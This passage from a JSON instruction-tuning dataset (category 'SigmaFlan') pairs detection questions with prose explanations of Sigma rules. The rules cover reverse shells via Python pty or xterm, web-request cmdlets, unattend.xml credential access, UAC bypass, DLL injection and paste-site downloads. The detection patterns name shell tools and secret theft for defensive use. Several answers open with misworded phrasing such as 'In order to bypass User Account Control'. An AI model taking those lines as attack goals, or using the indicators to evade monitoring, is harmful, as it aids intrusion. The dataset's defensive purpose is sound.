and monitoring for such activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "download of suspicious file type from a well-known file and paste sharing domain",
      "answer": "In order to detect the download of suspicious file type from a well-known file and paste sharing domain, you should monitor Windows event logs for file creation events that have hashes generated for their streams (`create_stream_hash` category). Specifically, focus on the contents of these files for specific domains known to host and share files, which include 'transfer.sh', 'raw.githubusercontent.com', 'gist.githubusercontent.com', 'pastebin.com', 'cdn.discordapp.com/attachments/', 'mediafire.com', 'mega.nz', 'ddns.net', '.paste.ee', '.hastebin.com', '.ghostbin.co/', 'ufile.io', 'storage.googleapis.com', 'anonfiles.com', 'send.exploit.in', 'privatlab.net', 'privatlab.com', 'sendspace.com', 'pastetext.net', 'pastebin.pl', and 'paste.ee'. Additionally, check if the file extensions of the created files are modified with ':Zone' identifier which is indicative of attempts to bypass security measures, specifically looking for '.ps1:Zone', '.bat:Zone', and '.cmd:Zone'. The attention to both the content sources and the unusual modification in file extensions helps in identifying potentially malicious downloads from known file sharing services and domains often used for distributing malware or tools for cyberattacks. Log fields such as 'TargetFilename' and 'Image' are crucial for this detection, helping to specify and locate the files of interest. Despite the robustness of this approach, there may be unknown scenarios leading to false positives, emphasizing the importance of context and further investigation upon detection. The associated risk level for these detections is deemed medium, reflecting the need for awareness and monitoring for such activities."
    }
  },
  {
    "instruction": "Can you explain how to detect: python spawning a pretty tty which could be indicative of potential reverse shell activity",
    "context": "",
    "output": "Certainly!\n\nIn order to detect Python spawning a pseudo-terminal (pty) which could be indicative of potential reverse shell activity, you should: Monitor the process creation logs on Linux systems for instances where Python binaries are invoked. Specifically, look for process executions where the image path ends with '/python', '/python2', or '/python3', or contains '/python2.' or '/python3.', which denotes various versions of Python. Additionally, inspect the command line arguments for either explicit importation and use of the 'pty' module with 'import pty' followed by '.spawn(' in the same command, or for the specific phrase 'from pty import spawn'. These patterns in the command line arguments suggest an attempt to open a pseudo-terminal, often used in reverse shell attacks to create an interactive shell environment. It's important, however, to consider that there might be legitimate uses of these command patterns, though such instances are unknown. This monitoring is crucial as it pertains to the tactics and techniques associated with Execution, and the technique specifically looks for signs of potential Command and Control activities via reverse shells.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "python spawning a pretty tty which could be indicative of potential reverse shell activity",
      "answer": "In order to detect Python spawning a pseudo-terminal (pty) which could be indicative of potential reverse shell activity, you should: Monitor the process creation logs on Linux systems for instances where Python binaries are invoked. Specifically, look for process executions where the image path ends with '/python', '/python2', or '/python3', or contains '/python2.' or '/python3.', which denotes various versions of Python. Additionally, inspect the command line arguments for either explicit importation and use of the 'pty' module with 'import pty' followed by '.spawn(' in the same command, or for the specific phrase 'from pty import spawn'. These patterns in the command line arguments suggest an attempt to open a pseudo-terminal, often used in reverse shell attacks to create an interactive shell environment. It's important, however, to consider that there might be legitimate uses of these command patterns, though such instances are unknown. This monitoring is crucial as it pertains to the tactics and techniques associated with Execution, and the technique specifically looks for signs of potential Command and Control activities via reverse shells."
    }
  },
  {
    "instruction": "Can you explain how to detect: Bypasses User Account Control using a fileless method",
    "context": "",
    "output": "Certainly!\n\nIn order to bypass User Account Control using a fileless method, you should monitor Windows registry modification events specifically looking for instances where a registry setting is changed ('SetValue' event type). Focus on modifications to registry keys ending with '\\open\\command\\DelegateExecute', especially where the modification details are empty, indicating a potential manipulation to leverage fileless execution methods which wouldn't prompt for User Account Control (UAC). Such activities are highly suspicious and are rarely legitimate, hence classified with a high level of concern. Tracking modifications in this specific area of the registry helps in detecting attempts to bypass UAC mechanisms without deploying traditional executable files, aligning with tactics typically seen in advanced persistent threats (APTs) aiming for stealth and persistence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Bypasses User Account Control using a fileless method",
      "answer": "In order to bypass User Account Control using a fileless method, you should monitor Windows registry modification events specifically looking for instances where a registry setting is changed ('SetValue' event type). Focus on modifications to registry keys ending with '\\open\\command\\DelegateExecute', especially where the modification details are empty, indicating a potential manipulation to leverage fileless execution methods which wouldn't prompt for User Account Control (UAC). Such activities are highly suspicious and are rarely legitimate, hence classified with a high level of concern. Tracking modifications in this specific area of the registry helps in detecting attempts to bypass UAC mechanisms without deploying traditional executable files, aligning with tactics typically seen in advanced persistent threats (APTs) aiming for stealth and persistence."
    }
  },
  {
    "instruction": "How can I detect: use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
    "context": "",
    "output": "In order to detect the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs, you should monitor for activities in the PowerShell scripting environment, specifically through the script block logging feature on Windows systems. Look for the execution of commands or uses of classes that initiate web requests. These include using `[System.Net.WebRequest]::create`, invoking commands like `curl `, `Invoke-RestMethod`, `Invoke-WebRequest`, `iwr `, employing the `Net.WebClient` class, or using BITS (Background Intelligent Transfer Service) with `Resume-BitsTransfer` and `Start-BitsTransfer` commands. Additionally, look out for usage of `wget ` and `WinHttp.WinHttpRequest`. It's important to exclude monitoring paths that start with `C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\` to reduce false positives. Be aware that legitimate uses of related commands for querying help or command information, such as using `Get-Command` and `Get-Help` modules referring to `Invoke-WebRequest` and `Start-BitsTransfer`, can lead to false positives. The importance of monitoring these activities is rated at a medium level of concern.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
      "answer": "In order to detect the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs, you should monitor for activities in the PowerShell scripting environment, specifically through the script block logging feature on Windows systems. Look for the execution of commands or uses of classes that initiate web requests. These include using `[System.Net.WebRequest]::create`, invoking commands like `curl `, `Invoke-RestMethod`, `Invoke-WebRequest`, `iwr `, employing the `Net.WebClient` class, or using BITS (Background Intelligent Transfer Service) with `Resume-BitsTransfer` and `Start-BitsTransfer` commands. Additionally, look out for usage of `wget ` and `WinHttp.WinHttpRequest`. It's important to exclude monitoring paths that start with `C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\` to reduce false positives. Be aware that legitimate uses of related commands for querying help or command information, such as using `Get-Command` and `Get-Help` modules referring to `Invoke-WebRequest` and `Start-BitsTransfer`, can lead to false positives. The importance of monitoring these activities is rated at a medium level of concern."
    }
  },
  {
    "instruction": "How can I detect: execution of curl.exe with custom useragent options",
    "context": "",
    "output": "In order to detect execution of curl.exe with custom useragent options, you should focus on monitoring process creation events on Windows operating systems. Specifically, look for instances where the curl executable, identified by ending in '\\curl.exe' and by the product name 'The curl executable', is started with command-line options indicative of custom user agent strings. These options include ' -A ' and ' --user-agent '. Such detection requires a comprehensive inspection of both the command line used to initiate the process, as well as the parent command line which initiated the curl process. Be aware, however, that there are legitimate reasons this activity might occur, such as scripts created by developers and admins or other administrative activities. These should be considered as potential false positives. The activity level for these detections is considered medium. Monitoring for these specific command-line options is crucial as it aligns with tactics and techniques that malicious actors might use to disguise their network communications or activities as coming from a legitimate source, by spoofing the user agent string.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of curl.exe with custom useragent options",
      "answer": "In order to detect execution of curl.exe with custom useragent options, you should focus on monitoring process creation events on Windows operating systems. Specifically, look for instances where the curl executable, identified by ending in '\\curl.exe' and by the product name 'The curl executable', is started with command-line options indicative of custom user agent strings. These options include ' -A ' and ' --user-agent '. Such detection requires a comprehensive inspection of both the command line used to initiate the process, as well as the parent command line which initiated the curl process. Be aware, however, that there are legitimate reasons this activity might occur, such as scripts created by developers and admins or other administrative activities. These should be considered as potential false positives. The activity level for these detections is considered medium. Monitoring for these specific command-line options is crucial as it aligns with tactics and techniques that malicious actors might use to disguise their network communications or activities as coming from a legitimate source, by spoofing the user agent string."
    }
  },
  {
    "instruction": "How to detect: events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675",
    "context": "",
    "output": "In order to detect events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675, you should: Identify and monitor specific event patterns within Windows print service logs. Focus on event ID 808, which signals issues with loading print spooler components. Look for errors with specific error codes, '0x45A' and '0x7e', indicating potential malicious activity. Watch out for messages stating \"The print spooler failed to load a plug-in module,\" which can be indicative of an attempted exploit. Additionally, scrutinize any occurrences of default file names common in proof of concept codes related to this attack, such as 'MyExploit.dll', 'evil.dll', and various others listed like '\\addCube.dll', '\\rev.dll', etc. \n\nBe vigilant for these signals but also consider the possibility of false positives. Situations where the error message includes phrases like 'registration timed out' should not be immediately considered an attack, as this can be a normal occurrence unrelated to malicious activity. Exclude these instances to improve the accuracy of your detection efforts.\n\nFurthermore, always record the name of the plugin DLL implicated in such events, as this information can be crucial for further investigation and response activities. Be aware that issues with printer drivers can also cause similar log entries, which are not necessarily indicative of an attack, thus representing potential false positives. The detection strategy should maintain a high alert level due to the serious implications of successful exploitation of CVE-2021-1675 through the print spooler service.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675",
      "answer": "In order to detect events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675, you should: Identify and monitor specific event patterns within Windows print service logs. Focus on event ID 808, which signals issues with loading print spooler components. Look for errors with specific error codes, '0x45A' and '0x7e', indicating potential malicious activity. Watch out for messages stating \"The print spooler failed to load a plug-in module,\" which can be indicative of an attempted exploit. Additionally, scrutinize any occurrences of default file names common in proof of concept codes related to this attack, such as 'MyExploit.dll', 'evil.dll', and various others listed like '\\addCube.dll', '\\rev.dll', etc. \n\nBe vigilant for these signals but also consider the possibility of false positives. Situations where the error message includes phrases like 'registration timed out' should not be immediately considered an attack, as this can be a normal occurrence unrelated to malicious activity. Exclude these instances to improve the accuracy of your detection efforts.\n\nFurthermore, always record the name of the plugin DLL implicated in such events, as this information can be crucial for further investigation and response activities. Be aware that issues with printer drivers can also cause similar log entries, which are not necessarily indicative of an attack, thus representing potential false positives. The detection strategy should maintain a high alert level due to the serious implications of successful exploitation of CVE-2021-1675 through the print spooler service."
    }
  },
  {
    "instruction": "Please help me detect the following: Firewall Rule Configuration is Modified or Deleted.",
    "context": "",
    "output": "Sure!\nIn order to identify when a Firewall Rule Configuration is Modified or Deleted, you should monitor Azure Activity Logs for any operations related to the modification or deletion of firewall policy rules and rule groups. Specifically, pay attention to activity involving the operation names MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/WRITE, MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/DELETE, MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/WRITE, and MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/DELETE. These operations indicate that a firewall policy\u2019s rule collection groups or rule groups are being written to (modified) or deleted, which could potentially weaken your network's defenses.\n\nBe aware that some modifications or deletions of firewall rules are legitimate, often performed by a system administrator as part of routine management or in response to evolving network requirements. It's important to verify the identity of the user making changes, the user agent, and the hostname involved in the operation to determine whether such activities are expected or authorized in your environment. Unfamiliar users modifying or deleting firewall configurations should trigger an investigation to ensure these actions aren't indicative of malicious activity or unauthorized access. If repeated false positives are identified - legitimate activities consistently flagged as suspicious - they should be documented and possibly exempted from future alerts to fine-tune the detection process. This approach maintains a focus on actual threats, thereby reducing the noise from benign activities and enabling a more effective cybersecurity posture.\n",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Firewall Rule Configuration is Modified or Deleted.",
      "answer": "In order to identify when a Firewall Rule Configuration is Modified or Deleted, you should monitor Azure Activity Logs for any operations related to the modification or deletion of firewall policy rules and rule groups. Specifically, pay attention to activity involving the operation names MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/WRITE, MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/DELETE, MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/WRITE, and MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/DELETE. These operations indicate that a firewall policy\u2019s rule collection groups or rule groups are being written to (modified) or deleted, which could potentially weaken your network's defenses.\n\nBe aware that some modifications or deletions of firewall rules are legitimate, often performed by a system administrator as part of routine management or in response to evolving network requirements. It's important to verify the identity of the user making changes, the user agent, and the hostname involved in the operation to determine whether such activities are expected or authorized in your environment. Unfamiliar users modifying or deleting firewall configurations should trigger an investigation to ensure these actions aren't indicative of malicious activity or unauthorized access. If repeated false positives are identified - legitimate activities consistently flagged as suspicious - they should be documented and possibly exempted from future alerts to fine-tune the detection process. This approach maintains a focus on actual threats, thereby reducing the noise from benign activities and enabling a more effective cybersecurity posture.\n"
    }
  },
  {
    "instruction": "Please help me detect the following: Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n",
    "context": "",
    "output": "Sure!\nIn order to detect adversaries attempting to find local system groups and permission settings to identify groups and users with elevated permissions, an analysis is conducted focused on PowerShell module activity within Windows systems. These activities often indicate an adversary's efforts to enumerate local system groups and their members, which can provide insights into users with elevated permissions, including those in the local administrators group. Detection of such activities involves monitoring for specific PowerShell commands.\n\nFirstly, PowerShell commands like 'get-localgroup' and 'Get-LocalGroupMember' are essential to watch for. These commands are indicative of attempts to list local groups and their members. Monitoring logs for the presence of these commands, either in the payload or context information of PowerShell module logs, holds importance.\n\nSecondly, the combination of 'Get-WMIObject' and 'Win32_Group' used together in PowerShell commands is another critical signal. This combination signifies efforts to query local group information via Windows Management Instrumentation (WMI), a more sophisticated method of accessing systems information which can include local group memberships and permissions.\n\nThese detection mechanisms are built on the premise that while legitimate administrative activities may employ these commands for routine system management and script execution, their use could also signify malicious intent. As a preventative measure, logs should be scrutinized for the execution of these specific PowerShell commands to guard against attempts to discover local system groups and elevate permissions through group membership awareness.\n\nGiven the nature of these detection strategies, occurrences might not always represent malicious actions. Sometimes, legitimate administrative tasks involve similar commands. Therefore, alerts generated at this level should be considered with a low severity rating until further analysis can verify the intent behind these commands. This consideration is crucial in distinguishing between normal administrative activities and potential security threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n",
      "answer": "In order to detect adversaries attempting to find local system groups and permission settings to identify groups and users with elevated permissions, an analysis is conducted focused on PowerShell module activity within Windows systems. These activities often indicate an adversary's efforts to enumerate local system groups and their members, which can provide insights into users with elevated permissions, including those in the local administrators group. Detection of such activities involves monitoring for specific PowerShell commands.\n\nFirstly, PowerShell commands like 'get-localgroup' and 'Get-LocalGroupMember' are essential to watch for. These commands are indicative of attempts to list local groups and their members. Monitoring logs for the presence of these commands, either in the payload or context information of PowerShell module logs, holds importance.\n\nSecondly, the combination of 'Get-WMIObject' and 'Win32_Group' used together in PowerShell commands is another critical signal. This combination signifies efforts to query local group information via Windows Management Instrumentation (WMI), a more sophisticated method of accessing systems information which can include local group memberships and permissions.\n\nThese detection mechanisms are built on the premise that while legitimate administrative activities may employ these commands for routine system management and script execution, their use could also signify malicious intent. As a preventative measure, logs should be scrutinized for the execution of these specific PowerShell commands to guard against attempts to discover local system groups and elevate permissions through group membership awareness.\n\nGiven the nature of these detection strategies, occurrences might not always represent malicious actions. Sometimes, legitimate administrative tasks involve similar commands. Therefore, alerts generated at this level should be considered with a low severity rating until further analysis can verify the intent behind these commands. This consideration is crucial in distinguishing between normal administrative activities and potential security threats."
    }
  },
  {
    "instruction": "Please help me detect the following: when an user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function's IAM role for AWS API calls.\nThis would give an adversary access to the privileges associated with the Lambda service role that is attached to that function.\n",
    "context": "",
    "output": "Sure!\nIn order to detect when a user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function's IAM role for AWS API calls, which would give an adversary access to the privileges associated with the Lambda service role that is attached to that function, you should: Monitor AWS CloudTrail logs specifically for events targeting the Lambda service. Focus on log entries where the event source is identified as 'lambda.amazonaws.com' and the event name begins with 'UpdateFunctionConfiguration'. This action indicates attempts or actions taken to modify the configuration of a Lambda function, which could include attaching a Lambda layer. Be aware of potential false positives, such as legitimate administrative actions where a system administrator is performing routine updates or attachments of Lambda layers. It is essential to verify the context of these actions by examining the user identity, user agent, and hostname involved in the changes to determine if they are expected or authorized activities in your environment. Actions initiated by unfamiliar users that involve attaching Lambda layers should be investigated more thoroughly. If certain activities are known and expected within your environment, causing these alerts to trigger, you can exempt them to reduce the noise from false positives. This monitoring strategy is pivotal in identifying unauthorized and potentially malicious modifications that aim to exploit Lambda function's permissions for undesired access or behavior, associating the activity with privilege escalation techniques.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when an user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function's IAM role for AWS API calls.\nThis would give an adversary access to the privileges associated with the Lambda service role that is attached to that function.\n",
      "answer": "In order to detect when a user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function's IAM role for AWS API calls, which would give an adversary access to the privileges associated with the Lambda service role that is attached to that function, you should: Monitor AWS CloudTrail logs specifically for events targeting the Lambda service. Focus on log entries where the event source is identified as 'lambda.amazonaws.com' and the event name begins with 'UpdateFunctionConfiguration'. This action indicates attempts or actions taken to modify the configuration of a Lambda function, which could include attaching a Lambda layer. Be aware of potential false positives, such as legitimate administrative actions where a system administrator is performing routine updates or attachments of Lambda layers. It is essential to verify the context of these actions by examining the user identity, user agent, and hostname involved in the changes to determine if they are expected or authorized activities in your environment. Actions initiated by unfamiliar users that involve attaching Lambda layers should be investigated more thoroughly. If certain activities are known and expected within your environment, causing these alerts to trigger, you can exempt them to reduce the noise from false positives. This monitoring strategy is pivotal in identifying unauthorized and potentially malicious modifications that aim to exploit Lambda function's permissions for undesired access or behavior, associating the activity with privilege escalation techniques."
    }
  },
  {
    "instruction": "Please help me detect the following: Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process\n",
    "context": "",
    "output": "Sure!\nIn order to attempt to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored. If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process, you should: Monitor Windows file events for any attempt to access or interact with files ending in '\\unattend.xml'. This specific file is known to hold sensitive information, such as credentials, which are utilized during the Windows installation process in an unattended manner. The monitoring should focus on any activity around this file within the installation logs directory, typically associated with legitimate or illegitimate attempts to gather credentials. Alerts of medium urgency should be generated upon detection to signify potential unauthorized access attempts or misuse, despite the fact that false positives may be initially unknown.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process\n",
      "answer": "In order to attempt to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored. If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process, you should: Monitor Windows file events for any attempt to access or interact with files ending in '\\unattend.xml'. This specific file is known to hold sensitive information, such as credentials, which are utilized during the Windows installation process in an unattended manner. The monitoring should focus on any activity around this file within the installation logs directory, typically associated with legitimate or illegitimate attempts to gather credentials. Alerts of medium urgency should be generated upon detection to signify potential unauthorized access attempts or misuse, despite the fact that false positives may be initially unknown."
    }
  },
  {
    "instruction": "Explain how should I detect the following: renamed vmnat.exe or portable version that can be used for DLL side-loading",
    "context": "",
    "output": "In order to detect renamed vmnat.exe or portable version that can be used for DLL side-loading, you should: Monitor Windows process creation logs for the execution of programs originally named 'vmnat.exe'. Ensure to differentiate between legitimate instances of 'vmnat.exe' and those instances where the executable image name ends with 'vmnat.exe', which could potentially indicate a renamed or portable version being used maliciously for DLL side-loading tactics. It's crucial to apply this detection logic without assuming all activity related to 'vmnat.exe' is malicious, as there may be legitimate use cases, thus minimizing false positives is important despite their unpredictability in this context. The importance of this monitoring is emphasized by the high level assigned to the detection of this activity, pointing to its potential severity in the context of cyber threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "renamed vmnat.exe or portable version that can be used for DLL side-loading",
      "answer": "In order to detect renamed vmnat.exe or portable version that can be used for DLL side-loading, you should: Monitor Windows process creation logs for the execution of programs originally named 'vmnat.exe'. Ensure to differentiate between legitimate instances of 'vmnat.exe' and those instances where the executable image name ends with 'vmnat.exe', which could potentially indicate a renamed or portable version being used maliciously for DLL side-loading tactics. It's crucial to apply this detection logic without assuming all activity related to 'vmnat.exe' is malicious, as there may be legitimate use cases, thus minimizing false positives is important despite their unpredictability in this context. The importance of this monitoring is emphasized by the high level assigned to the detection of this activity, pointing to its potential severity in the context of cyber threats."
    }
  },
  {
    "instruction": "Explain how should I detect the following: use of SysmonEnte, a tool to attack the integrity of Sysmon",
    "context": "",
    "output": "In order to detect the use of SysmonEnte, a tool to attack the integrity of Sysmon, you should: Focus on monitoring process access within Windows systems. Specifically, watch for any process that attempts to access 'C:\\Windows\\Sysmon64.exe' with granted access rights of '0x1400'. However, it's important to exclude any access attempts that originate from common system directories such as 'C:\\Program Files' and 'C:\\Windows\\System32\\', as these are likely to be legitimate. Besides, any access from 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\' ending with '\\MsMpEng.exe' should also be disregarded to avoid false alarms linked to Microsoft Defender processes. Additionally, pay attention to call traces that contain the string 'Ente', which could indicate the malicious operation of SysmonEnte. The detection strategy involves flagging scenarios that match either the direct access attempt with specified rights to Sysmon64.exe (excluding known good sources) or the presence of indicative call traces, thereby enhancing the accuracy of detecting attacks aimed at undermining Sysmon's integrity. Note that there may be unknown false positives, and the threat level associated with this detection is considered high.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of SysmonEnte, a tool to attack the integrity of Sysmon",
      "answer": "In order to detect the use of SysmonEnte, a tool to attack the integrity of Sysmon, you should: Focus on monitoring process access within Windows systems. Specifically, watch for any process that attempts to access 'C:\\Windows\\Sysmon64.exe' with granted access rights of '0x1400'. However, it's important to exclude any access attempts that originate from common system directories such as 'C:\\Program Files' and 'C:\\Windows\\System32\\', as these are likely to be legitimate. Besides, any access from 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\' ending with '\\MsMpEng.exe' should also be disregarded to avoid false alarms linked to Microsoft Defender processes. Additionally, pay attention to call traces that contain the string 'Ente', which could indicate the malicious operation of SysmonEnte. The detection strategy involves flagging scenarios that match either the direct access attempt with specified rights to Sysmon64.exe (excluding known good sources) or the presence of indicative call traces, thereby enhancing the accuracy of detecting attacks aimed at undermining Sysmon's integrity. Note that there may be unknown false positives, and the threat level associated with this detection is considered high."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of \"xterm\" as a potential reverse shell tunnel",
    "context": "",
    "output": "Certainly!\n\nIn order to detect usage of \"xterm\" as a potential reverse shell tunnel, you should: Monitor process creation logs on Linux systems for instances where the process image name contains 'xterm', and the command line arguments include '-display' and end with ':1'. This activity could indicate an attempt to establish a reverse shell tunnel using the 'xterm' application, which is a scenario associated with potential malicious activity. It's important to note that the confidence level of this detection is medium, meaning that while it's a significant indicator of the outlined attack, there could be benign instances that match these criteria, although no specific known benign use cases are identified.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of \"xterm\" as a potential reverse shell tunnel",
      "answer": "In order to detect usage of \"xterm\" as a potential reverse shell tunnel, you should: Monitor process creation logs on Linux systems for instances where the process image name contains 'xterm', and the command line arguments include '-display' and end with ':1'. This activity could indicate an attempt to establish a reverse shell tunnel using the 'xterm' application, which is a scenario associated with potential malicious activity. It's important to note that the confidence level of this detection is medium, meaning that while it's a significant indicator of the outlined attack, there could be benign instances that match these criteria, although no specific known benign use cases are identified."
    }
  },
  {
    "instruction": "Explain how should I detect the following: A General detection for specific decompress commands in PowerShell logs. This could be an adversary decompressing files.",
    "context": "",
    "output": "In order to detect a potential adversary decompressing files using specific commands in PowerShell logs, you should: Focus on monitoring the PowerShell module logs within Windows environments. Specifically, look for occurrences where the 'Expand-Archive' command is utilized, as it indicates the extraction or decompression of file archives. This action is noteworthy and categorized as informational because it could suggest an adversary is deploying or accessing compressed files possibly for malicious purposes. It is crucial to track such activities, although determining them as malicious with certainty may require additional context due to the possibility of legitimate administrative use.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "A General detection for specific decompress commands in PowerShell logs. This could be an adversary decompressing files.",
      "answer": "In order to detect a potential adversary decompressing files using specific commands in PowerShell logs, you should: Focus on monitoring the PowerShell module logs within Windows environments. Specifically, look for occurrences where the 'Expand-Archive' command is utilized, as it indicates the extraction or decompression of file archives. This action is noteworthy and categorized as informational because it could suggest an adversary is deploying or accessing compressed files possibly for malicious purposes. It is crucial to track such activities, although determining them as malicious with certainty may require additional context due to the possibility of legitimate administrative use."
    }
  },
  {
    "instruction": "How to detect: OilRig schedule task persistence as reported by Nyotron in their March 2018 report",
    "context": "",
    "output": "In order to Detects OilRig schedule task persistence as reported by Nyotron in their March 2018 report, you should: Monitor Windows security logs for the creation of scheduled tasks. Specifically, watch for events with the EventID 4698 that include task names 'SC Scheduled Scan' or 'UpdatMachine'. These specific tasks are indicators of the OilRig group's tactics for maintaining persistence on a compromised system. False positives for this behavior are unlikely, and the critical level of this detection emphasizes the need for immediate investigation upon such event identification. This approach is vital for identifying potential malicious activities associated with the known OilRig campaign and its methods of establishing persistence through scheduled tasks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "OilRig schedule task persistence as reported by Nyotron in their March 2018 report",
      "answer": "In order to Detects OilRig schedule task persistence as reported by Nyotron in their March 2018 report, you should: Monitor Windows security logs for the creation of scheduled tasks. Specifically, watch for events with the EventID 4698 that include task names 'SC Scheduled Scan' or 'UpdatMachine'. These specific tasks are indicators of the OilRig group's tactics for maintaining persistence on a compromised system. False positives for this behavior are unlikely, and the critical level of this detection emphasizes the need for immediate investigation upon such event identification. This approach is vital for identifying potential malicious activities associated with the known OilRig campaign and its methods of establishing persistence through scheduled tasks."
    }
  },
  {
    "instruction": "How can I detect: Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization.",
    "context": "",
    "output": "In order to detect when a Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization, you should: Focus on analyzing logs generated by the threat management service within Microsoft 365 products. Specifically, pay attention to entries coming from the SecurityComplianceCenter. Look for events named 'Data exfiltration to unsanctioned apps' that have been marked as successful. This detection mechanism aims to identify actions that may involve transferring sensitive data outside the organization through applications that are not approved or recognized, indicating a potential security threat. Be aware of false positives, as the nature of these incidents might sometimes be misidentified. The severity level of this activity is considered medium, highlighting the need for timely investigation to prevent unauthorized access or loss of data.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization.",
      "answer": "In order to detect when a Microsoft Cloud App Security reported when a user or IP address uses an app that is not sanctioned to perform an activity that resembles an attempt to exfiltrate information from your organization, you should: Focus on analyzing logs generated by the threat management service within Microsoft 365 products. Specifically, pay attention to entries coming from the SecurityComplianceCenter. Look for events named 'Data exfiltration to unsanctioned apps' that have been marked as successful. This detection mechanism aims to identify actions that may involve transferring sensitive data outside the organization through applications that are not approved or recognized, indicating a potential security threat. Be aware of false positives, as the nature of these incidents might sometimes be misidentified. The severity level of this activity is considered medium, highlighting the need for timely investigation to prevent unauthorized access or loss of data."
    }
  },
  {
    "instruction": "How can I detect: potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process",
    "context": "",
    "output": "In order to detect potential use of CreateRemoteThread API and LoadLibrary function to inject DLL into a process, you should look for events within Windows logs that fall under the category of create_remote_thread. Specifically, focus your attention on instances where a thread is created remotely and initiates from the module ending with '\\kernel32.dll'. The hallmark activity to watch for is the use of the 'LoadLibraryA' function. This particular combination of starting module and function strongly suggests an attempt to inject a DLL into another process, which is a technique attackers might use to execute malicious code within the context of legitimate processes on the victim's system. Given the nature of this behavior, there are no known benign circumstances that exactly match this pattern, making every hit potentially significant and the level of alert high. The tags related to this detection strategy include tactics and techniques such as Execution, Persistence, Privilege Escalation, and Defense Evasion, particularly focusing on process injection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process",
